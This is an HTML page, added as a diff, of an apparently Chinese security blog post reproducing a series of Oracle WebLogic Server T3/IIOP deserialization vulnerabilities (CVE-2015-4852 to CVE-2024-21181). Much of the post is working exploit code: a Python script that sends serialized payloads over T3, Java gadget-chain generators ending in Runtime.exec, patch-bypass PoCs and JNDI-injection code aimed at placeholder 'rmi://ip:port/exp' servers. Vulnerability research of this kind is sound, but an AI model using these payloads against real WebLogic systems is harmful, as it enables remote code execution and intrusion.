@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Weblogic Server系列漏洞复现 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="复现了Weblogic Server关于T3/IIOP的一系列反序列化漏洞">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="Weblogic Server系列漏洞复现">
+  <meta property="og:description" content="复现了Weblogic Server关于T3/IIOP的一系列反序列化漏洞">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-23T13:51:20+00:00">
+    <meta property="article:modified_time" content="2025-02-23T13:51:20+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic Server系列漏洞复现">
+<meta name="twitter:description" content="复现了Weblogic Server关于T3/IIOP的一系列反序列化漏洞">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Weblogic Server系列漏洞复现",
+      "item": "https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Weblogic Server系列漏洞复现",
+  "name": "Weblogic Server系列漏洞复现",
+  "description": "复现了Weblogic Server关于T3/IIOP的一系列反序列化漏洞",
+  "keywords": [
+    
+  ],
+  "articleBody": "环境配置 使用WeblogicEnvironment项目搭建，地址：WeblogicEnvironment\nWeblogic Server官网下载地址：https://www.oracle.com/hk/middleware/technologies/weblogic-server-downloads.html\noracle删除了官网上所有的Weblogic Server 10.3.6.0.0的下载链接，只剩下了12.x和14.x的。不过我们可以通过url直接下载：http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar\ndocker build或者run的时候可能会内存不足，增加ulimit即可：--ulimit nofile=65535:65535\ndocker里的java版本最好和idea使用的版本一样，不然容易出现debug行号不一致的问题。\n由于centos 8 于2021年12月31日停止了源的服务，需要修改yum的源等等操作，修改Dockerfile:\nRUN cd /etc/yum.repos.d/\rRUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*\rRUN sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-* 从容器里复制出lib导入idea即可开始debug，端口以为8453：\n/u01/app/oracle/middleware/modules /u01/app/oracle/middleware/wlserver\r/u01/app/oracle/middleware/coherence_3.7/lib T3反序列化 CVE-2015-4852 Weblogic 10.3.6\nJDK8u65\nT3协议部分参考：http://drops.xmd5.com/static/drops/web-13470.html\nWeblogic Server 使用T3协议进行RMI通信，请求包格式如下： 第一部分为T3协议头，后面跟着7段java序列化数据，将其中任意一部分改为恶意序列化数据即可。\n关于其中探测版本部分，我发现有时返回包会分到两个TCP数据包里发过来，所以脚本需要改一下：\ndata = sock.recv(1024) if len(data) == 4: data = data + sock.recv(1024) 数据流先进入InboundMsgAbbrev#readObject方法：\nprivate Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException { int var2 = var1.read(); switch (var2) { case 0: return (new ServerChannelInputStream(var1)).readObject(); case 1: return var1.readASCII(); default: throw new StreamCorruptedException(\"Unknown typecode: '\" + var2 + \"'\"); } } 然后进入ServerChannelInputStream#readObject方法，这个类实现了resolveClass方法：\nprotected Class resolveClass(ObjectStreamClass var1) throws ClassNotFoundException, IOException { Class var2 = super.resolveClass(var1); if (var2 == null) { throw new ClassNotFoundException(\"super.resolveClass returns null.\"); } else { ObjectStreamClass var3 = ObjectStreamClass.lookup(var2); if (var3 != null \u0026\u0026 var3.getSerialVersionUID() != var1.getSerialVersionUID()) { throw new ClassNotFoundException(\"different serialVersionUID. local: \" + var3.getSerialVersionUID() + \" remote: \" + var1.getSerialVersionUID()); } else { return var2; } } } 不过这个版本没有过滤，不影响。ServerChannelInputStream没有重写readObject，所以直接进入java.io.ObjectInputStream#readObject方法。畅通无阻。\n10.3.6版本带有cc3.2.0的依赖，可以打cc链，exp如下：\nimport socket import struct import re import binascii def get_payload(path): with open(path, \"rb\") as f: return f.read() def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\".encode() sock.sendall(handshake) data = sock.recv(1024) if len(data) == 4: data = data + sock.recv(1024) pattern = re.compile(r\"HELO:(.*).false\") version = re.findall(pattern, data.decode()) if len(version) == 0: print(\"Not Weblogic\") return print(\"Weblogic {}\".format(version[0])) data_len = binascii.a2b_hex(b\"00000000\") #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") #t3协议头 flag = binascii.a2b_hex(b\"fe010000\") #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack('\u003eI', len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload) if __name__ == \"__main__\": host = \"\" port = 7001 payload = get_payload(\"./ser.bin\") exp(host, port, payload) 生成的恶意序列化放在./ser.bin。生成代码：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \"\"; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(\"foo\"); HashMap innimpl = (HashMap) getFieldValue(map, \"map\"); Object[] array = (Object[]) getFieldValue(innimpl, \"table\"); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \"key\", entry); serToFile(map); } } CVE-2016-0638 (readExternal绕过) Weblogic 10.3.6\nJDK8u65\nCVE-2015-4852的补丁就是在resolveclass里添加类黑名单检测，绕过思路就是二次反序列化。\njava.io.ObjectInputStream#readObject会调用readOrdinaryObject方法反序列化为Object，其中如果可拓展会调用readExternalData方法：\nprivate Object readOrdinaryObject(boolean unshared) throws IOException { if (bin.readByte() != TC_OBJECT) { throw new InternalError(); } ObjectStreamClass desc = readClassDesc(false); desc.checkDeserialize(); ................ if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } ................. return obj; } 最终会调用这个Externalizable类的readExternal方法。\nStreamMessageImpl类的readExternal方法代码如下：\npublic void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException { super.readExternal(var1); byte var2 = var1.readByte(); byte var3 = (byte)(var2 \u0026 127); if (var3 \u003e= 1 \u0026\u0026 var3 \u003c= 3) { switch (var3) { case 1: this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1); BufferInputStream var4 = this.payload.getInputStream(); ObjectInputStream var5 = new ObjectInputStream(var4); this.setBodyWritable(true); this.setPropertiesWritable(true); try { while(true) { this.writeObject(var5.readObject()); ................ } 可以调用原生的readObject方法，绕过黑名单。\n这个类需要自己生成：\ncd WL_HOME/server/lib java -jar ../../../modules/com.bea.core.jarbuilder_X.X.X.X.jar 生成的wlfullclient.jar复制出来导入idea。\n对应的StreamMessageImpl类也有一个writeExternal方法，不过不可控，用javassist改一下，然后序列化时会将CC链的序列化数据写入External数据部分，poc代码如下：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \"\"; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(\"foo\"); HashMap innimpl = (HashMap) getFieldValue(map, \"map\"); Object[] array = (Object[]) getFieldValue(innimpl, \"table\"); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \"key\", entry); byte[] data = ser(map); String base64Code = Base64.getEncoder().encodeToString(data); int length = data.length; ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(\"weblogic.jms.common.StreamMessageImpl\"); CtMethod writeReplace = ctClass0.getDeclaredMethod(\"writeExternal\"); String code = \"{\\n\" + \"System.out.println(1);\\n\" + \"super.writeExternal($1);\\n\" + \"java.io.ObjectOutput out = (java.io.ObjectOutput) $1;\\n\" + \"out.writeByte(1);\\n\" + \"\\n\" + \"int length = \" + length + \";\\n\" + \"String base64Code = \\\"\"+ base64Code + \"\\\";\\n\" + \"byte[] buffer = java.util.Base64.getDecoder().decode(base64Code);\\n\" + \"\\n\" + \"out.writeInt(length);\\n\" + \"out.write(buffer);}\"; writeReplace.setBody(code); ctClass0.detach(); ctClass0.toClass(); StreamMessageImpl streamMessage = new StreamMessageImpl(); serToFile(streamMessage); } } 然后再用python脚本发送即可。\nCVE-2016-3510 (readResolve绕过) Weblogic 10.3.6\nJDK8u65\nCVE-2015-4852的另一种绕过。\n还是之前分析的ObjectInputStream#readOrdinaryObject方法：\nprivate Object readOrdinaryObject(boolean unshared) throws IOException { ............. if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } handles.finish(passHandle); if (obj != null \u0026\u0026 handles.lookupException(passHandle) == null \u0026\u0026 desc.hasReadResolveMethod()) { Object rep = desc.invokeReadResolve(obj); if (unshared \u0026\u0026 rep.getClass().isArray()) { rep = cloneArray(rep); } if (rep != obj) { handles.setObject(passHandle, obj = rep); } } return obj; } 在检查完isExternalizable后会再检查是否具有readResolve方法，有的话就调用。\nweblogic.corba.utils.MarshalledObject的readResolve的方法可以进行二次反序列化：\npublic Object readResolve() throws IOException, ClassNotFoundException, ObjectStreamException { if (this.objBytes == null) { return null; } else { ByteArrayInputStream var1 = new ByteArrayInputStream(this.objBytes); ObjectInputStream var2 = new ObjectInputStream(var1); Object var3 = var2.readObject(); var2.close(); return var3; } } 这个类也在wlfullclient.jar里，需要自己生成。\npoc代码如下：\npublic class Exp { public static void main(String[] args) throws Exception { String command = \"\"; final String[] execArgs = new String[] { command }; final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(\"foo\"); HashMap innimpl = (HashMap) getFieldValue(map, \"map\"); Object[] array = (Object[]) getFieldValue(innimpl, \"table\"); Object node = array[0]; if(node == null){ node = array[1]; } setFieldValue(node, \"key\", entry); MarshalledObject marshalledObject = new MarshalledObject(map); serToFile(marshalledObject); } } CVE-2017-3248 Weblogic 10.3.6\nJDK8u65\nJRMP协议也可以触发readObject。\n使用ysoserial的JRMPListener即可。\n补丁添加的黑名单.\nCVE-2018-2628 Weblogic 10.3.6\nJDK8u65\nJRMP的UnicastRef类有readExternal方法，可以直接用这个类来反序列化绕过黑名单检测。\npublic void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException { this.ref = LiveRef.read(var1, false); } 最终也会触发TCPEndpoint连接，触发JRMP反序列化。\npoc:\npublic class Exp { public static void main(String[] args) throws Exception { String host = \"ip\"; int port = ; ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); serToFile(ref); } } ip和port指向ysoserial的JRMPListener监听的地址。\nIIOP协议反序列化 Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口\nCommon Object Request Broker Architecture（公共对象请求代理体系结构）是由OMG(Object Management Group)组织制定的一种标准分布式对象结构。使用平台无关的语言IDL（interface definition language）描述连接到远程对象的接口，然后将其映射到制定的语言实现。 一般来说CORBA将其结构分为三部分：\nnaming service client side servant side GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。\nRMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。但是现在有了RMI-IIOP，稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，这样综合了RMI的简单性和CORBA的多语言性兼容性，RMI-IIOP克服了RMI只能用于Java的缺点和CORBA的复杂性。\n网路问题 IIOP在bind时会绑定在0.0.0.0上，默认只能带本地。\n可以尝试修改IIOP的部分实现代码。我这里用javassist修改了weblogic.iiop.IOPProfile#read，强制改为指定的ip。\nString ip = \"\"; String port = \"7001\"; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\"weblogic.iiop.IOPProfile\"); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\"read\"); String code = \"this.host = \\\"\" + ip + \"\\\";\"; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); CVE-2020-2551 Weblogic 10.3.6\nJDK8u65\n与JRMP类似，IIOP协议在不同组件之间通信是通过序列化/反序列化。\nJtaTransactionManager类本身不在黑名单里了，但其父类AbstractPlatformTransactionManager在黑名单里，T3协议使用resolveClass过滤，这个方法也会检测父类，可以过滤JtaTransactionManager类，而IIOP协议不使用resolveClass，所以不会过滤，所以无法根据父类将其过滤。\nJtaTransactionManager在反序列化时会通过JNDI去加载对象。\npoc如下：\npublic class Exp { public static void main(String[] args) throws Exception { String ip = \"\"; String port = \"7001\"; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\"weblogic.iiop.IOPProfile\"); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\"read\"); String code = \"this.host = \\\"\" + ip + \"\\\";\"; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); try { Hashtable\u003cString, String\u003e env = new Hashtable\u003cString, String\u003e(); env.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\"); env.put(\"java.naming.provider.url\", String.format(\"iiop://%s:%s\", ip, port)); Context context = new InitialContext(env); // get Object to Deserialize JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(\"rmi://ip:port/Exploit\"); Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(\"pwnedasd\", jtaTransactionManager), Remote.class); System.out.println(\"start\"); context.bind(\"hello\", remote); } catch (Exception e){ e.printStackTrace(); } } } CVE-2023-21839 Weblogic 12.2.1.4\nJDK8u65\n12.x可以直接从官网下载，将/u01/app/oracle/middleware/wlserver下的所有导入idea。\n也需要导入wlfullclient.jar，与10.3.6的生成方式不同。\ncd /u01/app/oracle/middleware/wlserver/server/lib /java/bin/java -jar ../../modules/com.bea.core.jarbuilder.jar 当客户端向服务器lookup对象时，服务器会调用weblogic.corba.cos.naming.NamingContextImpl#resolveObject方法。\nprivate java.lang.Object resolveObject(String name) throws NamingException { if (name.equals(\"\")) { return this; } else { java.lang.Object o = this.getContext().lookup(name); ......................... 此时的context为weblogic.jndi.internal.WLContextImpl，如果绑定的对象不是NamingNode则会调用getObjectInstance:\nprotected Object resolveObject(String name, Object obj, int mode, Hashtable env) throws NamingException { Object resolved = obj; if (obj != null) { try { if (obj instanceof NamingNode) { resolved = ((NamingNode)obj).getContext(env); } else if (mode != 0 \u0026\u0026 mode \u003e= 0) { resolved = WLNamingManager.getObjectInstance(obj, new CompositeName(name), (Context)null, env); resolved = this.makeTransportable(resolved, name, env); } .............. 如果绑定的对象是OpaqueReference则调用其getReference方法。\n} else if (boundObject instanceof OpaqueReference) { boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx); weblogic.deployment.jms.ForeignOpaqueReference是OpaqueReference的一个实现类，其getReference方法可以触发原生JNDI lookup，关键代码如下：\npublic Object getReferent(Name name, Context ctx) throws NamingException { AbstractSubject originalSubject = SubjectManager.getSubjectManager().getCurrentSubject(KERNEL_ID); InitialContext context; if (this.jndiEnvironment == null) { context = new InitialContext(); } else { if (this.jndiEnvironment.get(\"java.naming.factory.initial\") == null) { this.jndiEnvironment.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\"); } context = new InitialContext(this.jndiEnvironment); } ..................... Object retVal; try { if (this.jndiEnvironment != null \u0026\u0026 AQJMS_ICF.equals(this.jndiEnvironment.get(\"java.naming.factory.initial\")) \u0026\u0026 this.remoteJNDIName != null \u0026\u0026 (this.remoteJNDIName.startsWith(AQJMS_QPREFIX) || this.remoteJNDIName.startsWith(AQJMS_TPREFIX))) { synchronized(this) { if (this.cachedReferent == null) { this.cachedReferent = context.lookup(evalMacros(this.remoteJNDIName)); } } retVal = this.cachedReferent; } else { retVal = context.lookup(evalMacros(this.remoteJNDIName)); } } finally { SubjectManager.getSubjectManager().popSubject(KERNEL_ID); context.close(); } ................ } 当lookup一个ForeignOpaqueReference对象时会触发jndi lookup.\nremoteJNDIName属性需要反射写入，poc：\npublic class Exp { public static void main(String[] args) throws Exception { String ip = \"\"; String port = \"7001\"; ClassPool pool = ClassPool.getDefault(); CtClass IOPProfileCtClass = pool.get(\"weblogic.iiop.ior.IOPProfile\"); CtMethod read = IOPProfileCtClass.getDeclaredMethod(\"read\"); String code = \"this.host = \\\"\" + ip + \"\\\";\"; read.insertAfter(code); IOPProfileCtClass.detach(); IOPProfileCtClass.toClass(); Hashtable\u003cString, String\u003e env = new Hashtable\u003cString, String\u003e(); env.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\"); env.put(\"java.naming.provider.url\", String.format(\"iiop://%s:%s\", ip, port)); Context context = new InitialContext(env); ForeignOpaqueReference foreignOpaqueReference = new ForeignOpaqueReference(); setFieldValue(foreignOpaqueReference, \"remoteJNDIName\", \"rmi://ip:port/exp\"); System.out.println(\"start\"); context.rebind(\"helloasd\", foreignOpaqueReference); context.lookup(\"helloasd\"); } } 直接将ForeignOpaqueReferencerebind，接着lookup即可，还是需要用javassist修改函数才能打远程。不过12.2.1.4版本中类名从weblogic.iiop.IOPProfile改为了weblogic.iiop.ior.IOPProfile.\nCVE-2024-20931 Weblogic 12.2.1.4\nJDK8u65\n属于CVE-2023-21839的绕过，补丁添加了两个过滤：\n如果jndiEnvironment中providerURL不为null会检查签名 限制了JNDI的协议类型 之前打CVE-2023-21839时jndiEnv为null，这次需要用jndiEnv的java.naming.factory.initial属性指定本地工厂类。\n服务器在创建上下文时会调用这个工厂类的getInitialContext方法。\n堆栈如下：\njavax.naming.spi.InitialContextFactory#getInitialContext\rjavax.naming.spi.NamingManager#getInitialContext\rjavax.naming.InitialContext#getDefaultInitCtx\rjavax.naming.InitialContext#init\rjavax.naming.InitialContext#\rweblogic.deployment.jms.ForeignOpaqueReference#getReferent\rweblogic.jndi.internal.WLNamingManager#getObjectInstance\rweblogic.jndi.internal.BasicNamingNode#resolveObject\rweblogic.jndi.internal.BasicNamingNode#resolveObject\rweblogic.jndi.internal.BasicNamingNode#lookupSharable\rweblogic.jndi.internal.PartitionHandler#lookupSharable\rweblogic.jndi.internal.ServerNamingNode#lookup\rweblogic.jndi.internal.RootNamingNode#lookup\rweblogic.jndi.internal.WLEventContextImpl#lookup\rweblogic.jndi.internal.WLContextImpl#lookup\rjavax.naming.InitialContext#lookup\rweblogic.corba.cos.naming.NamingContextImpl#resolveObject AQjmsInitialContextFactory这个工厂类的getInitialContext方法会调用根据参数dataSource进行原生jndi lookup。\n用poc能打通，不过我这边找不到这个类在哪，所以不知道具体触发jndi的代码是什么。\n反射写入jndiEnv即可。\nHashtable jndiEnv = new Hashtable(); jndiEnv.put(\"java.naming.factory.initial\", \"oracle.jms.AQjmsInitialContextFactory\"); jndiEnv.put(\"datasource\", \"rmi://ip:port/exp\"); setFieldValue(foreignOpaqueReference, \"jndiEnvironment\", jndiEnv); CVE-2024-21006 Weblogic 12.2.1.4\nJDK8u65\n漏洞的最终利用方式和CVE-2023-21839、CVE-2024-20931一致，都是利用 IIOP -\u003e JNDI 去造成远程代码执行，不过在整个触发的过程中有所不同。\n从CVE-2024-20931的调用堆栈来看，通过了weblogic.jndi.internal.BasicNamingNode#lookupSharable并进入了if代码块，代码如下：\nprotected Object lookupSharable(String name, Hashtable env) throws NamingException, RemoteException { String prefix = this.getPrefix(name); String restOfName = this.getRest(name); Object object = this.lookupHere(prefix, env, restOfName); if (restOfName.length() == 0) { if (NamingDebugLogger.isDebugEnabled()) { NamingDebugLogger.debug(\"+++ lookupInSharable(\" + name + \", \" + object.getClass().getName() + \") succeeded\"); } return this.resolveObject(prefix, object, env); } else { try { if (object instanceof BasicNamingNode) { object = ((BasicNamingNode)object).lookupSharable(restOfName, env); } else { object = this.getContinuationCtx(object, prefix, restOfName, env).lookup(restOfName); } } catch (NamingException var7) { throw this.prependResolvedNameToException(prefix, var7); } return this.makeTransportable(object, restOfName, env); } } 如果restOfName.length() == 0为真，进入else分支，让object不为BasicNamingNode类型会调用getContinuationCtx\n有一个补丁在getContinuationCtx里，限制了通过HTTP codebase加载远程类。后面会调用NamingManager#getContinuationContext：\npublic static Context getContinuationContext(CannotProceedException cpe) throws NamingException { Hashtable\u003cObject,Object\u003e env = (Hashtable\u003cObject,Object\u003e)cpe.getEnvironment(); if (env == null) { env = new Hashtable\u003c\u003e(7); } else { // Make a (shallow) copy of the environment. env = (Hashtable\u003cObject,Object\u003e)env.clone(); } env.put(CPE, cpe); ContinuationContext cctx = new ContinuationContext(cpe, env); return cctx.getTargetContext(); } 最终会调用到javax.naming.spi.NamingManager#getObjectInstance方法，这里就是原生jndi lookup调用本地工厂类的地方：\nfactory = getObjectFactoryFromReference(ref, f); if (factory != null) { return factory.getObjectInstance(ref, name, nameCtx, environment); } weblogic.application.naming.MessageDestinationObjectFactory类实现了ObjectFactory接口，可以作为工厂类，其getObjectInstance方法可以触发原生jndi lookup，相当于二次jndi注入绕过限制。\npublic Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable\u003c?, ?\u003e env) throws NamingException { if (!(obj instanceof MessageDestinationReference)) { throw new AssertionError(\"ObjectFactory should have been referenced only from EnvReference\"); } else { return ((MessageDestinationReference)obj).lookupMessageDestination(); } } public Object lookupMessageDestination() throws NamingException { InitialContext ic; if (this.initialContextFactory == null) { ic = new InitialContext(); } else { Hashtable\u003cString, String\u003e env = new Hashtable(); env.put(\"java.naming.factory.initial\", this.initialContextFactory); if (null != this.providerURL) { env.put(\"java.naming.provider.url\", this.providerURL); } ic = new InitialContext(env); } return ic.lookup(this.jndiName); } 需要bind一个MessageDestinationReference对象。其构造方法允许指定jndiName：\npublic MessageDestinationReference(Environment env, MessageDestinationRefBean msgDest, String jndiName, String providerURL, String initialContextFactory) throws EnvironmentException { super(env, msgDest.getMessageDestinationType(), \"weblogic.application.naming.MessageDestinationObjectFactory\"); this.jndiName = jndiName; this.providerURL = providerURL; this.initialContextFactory = initialContextFactory; } 似乎需要在weblogic运行时才能msgDest.getMessageDestinationType()，本地会报错，用javassist改一下就可以了：\nCtClass MessageDestinationReferenceCtClass = pool.get(\"weblogic.application.naming.MessageDestinationReference\"); CtConstructor[] cons = MessageDestinationReferenceCtClass.getDeclaredConstructors(); CtConstructor MessageDestinationReferenceCon = null; for(CtConstructor con : cons){ if (con.getParameterTypes()[0].getName().equals(\"weblogic.application.naming.Environment\")){ MessageDestinationReferenceCon = con; break; } } if (MessageDestinationReferenceCon == null){ System.out.println(\"con not found\"); System.exit(0); } MessageDestinationReferenceCon.setBody(\"{\\n\" + \" super($1, \\\"java.lang.Object\\\", \\\"weblogic.application.naming.MessageDestinationObjectFactory\\\");\\n\" + \" this.jndiName = $3;\\n\" + \" this.providerURL = $4;\\n\" + \" this.initialContextFactory = $5;\\n\" + \" }\"); MessageDestinationReferenceCtClass.detach(); MessageDestinationReferenceCtClass.toClass(); MessageDestinationReference messageDestinationReference = new MessageDestinationReference(null, null, \"rmi://ip:port/exp\", null, null); 回到前面，restOfName就是双引号之外的数据而且restOfName和第二个双引号直接要有一个.或/，类似这样：\"\"/，bind用name，lookup用name + restOfName。\ncontext.rebind(\"asda\", ref); context.lookup(\"\\\"asda\\\"/asd\"); 堆栈：\njavax.naming.InitialContext#lookup\rweblogic.application.naming.MessageDestinationReference#lookupMessageDestination\rweblogic.application.naming.MessageDestinationObjectFactory#getObjectInstance\rjavax.naming.spi.NamingManager#getObjectInstance\rjavax.naming.spi.NamingManager#getContext\rjavax.naming.spi.ContinuationContext#getTargetContext\rjavax.naming.spi.NamingManager#getContinuationContext\rweblogic.jndi.internal.BasicNamingNode#getContinuationCtx\rweblogic.jndi.internal.BasicNamingNode#lookupSharable\rweblogic.jndi.internal.PartitionHandler#lookupSharable\rweblogic.jndi.internal.ServerNamingNode#lookup\rweblogic.jndi.internal.RootNamingNode#lookup\rweblogic.jndi.internal.WLEventContextImpl#lookup\rweblogic.jndi.internal.WLContextImpl#lookup\rjavax.naming.InitialContext#lookup\rweblogic.corba.cos.naming.NamingContextImpl#resolveObject CVE-2024-21181 Weblogic 12.2.1.4\nJDK8u65\n另一个工厂类weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory其getObjectInstance方法代码如下：\npublic Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { Reference ref = (Reference)Reference.class.cast(obj); String pName = (String)ref.get(\"partitionName\").getContent(); JVMID jvmId = (JVMID)this.deserialize((byte[])((byte[])ref.get(\"jvmId\").getContent())); if (!jvmId.isLocal()) { throw new Exception(name + \" cannot be looked up using a remote JNDI context. Use JSR160 interface to use JMX remotely or use a local JNDI context to look up the local MBeanServer.\"); } else { MBeanServer delegateMbs = this.getDelegateMbs(); assert delegateMbs != null; return (new PartitionedMbsFactory()).create(pName, delegateMbs); } } 